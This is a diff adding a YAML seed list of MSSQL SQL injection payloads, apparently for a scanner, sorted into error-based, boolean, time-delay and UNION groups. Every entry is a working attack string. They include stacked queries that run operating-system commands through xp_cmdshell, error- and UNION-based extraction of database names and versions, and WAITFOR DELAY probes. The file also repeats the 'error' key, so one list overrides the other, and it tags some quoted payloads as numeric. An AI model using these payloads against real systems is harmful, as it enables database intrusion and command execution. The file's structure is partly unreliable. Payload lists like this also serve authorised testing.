@@ -1,0 +1,52 @@
+# MSSQL-specific SQLi payloads
+seeds:
+  sqli:
+    error:
+      - raw: "' AND CONVERT(int, (SELECT @@VERSION))-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "'; EXEC xp_cmdshell 'whoami'-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "1; DECLARE @s NVARCHAR(100); SET @s='test'; SELECT @s-- "
+        dbms: "MSSQL"
+        ctx: ["numeric"]
+    boolean_true:
+      - raw: "' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)>0-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "1 AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)>0-- "
+        dbms: "MSSQL"
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND (SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)>0-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "1 AND (SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)>0-- "
+        dbms: "MSSQL"
+        ctx: ["numeric"]
+    error:
+      - raw: "'; EXEC master..xp_cmdshell 'whoami'-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "' AND 1=(SELECT 1/0)-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- "
+        dbms: "MSSQL"
+        ctx: ["numeric"]
+    time_mssql:
+      - raw: "'; IF (1=1) WAITFOR DELAY '0:0:3'-- "
+        dbms: "MSSQL"
+      - raw: "1'; WAITFOR DELAY '0:0:3'-- "
+        dbms: "MSSQL"
+    union:
+      - raw: "' UNION SELECT NULL,NULL,NULL-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "' UNION SELECT DB_NAME(),2,3-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
